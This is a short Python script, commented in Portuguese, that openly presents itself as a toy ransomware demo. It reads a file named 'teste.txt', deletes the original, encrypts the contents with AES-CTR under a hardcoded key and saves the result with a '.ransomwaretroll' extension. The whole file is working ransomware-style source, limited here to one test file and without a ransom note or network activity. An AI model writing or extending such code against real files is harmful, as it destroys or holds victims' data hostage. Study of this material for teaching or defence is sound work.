import os
import pyaes

## abrir arquivo para criptografia

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover arquivo original

os.remove(file_name)

## definindo chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando

crypto_data = aes.encrypt(file_data)

## salvar arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
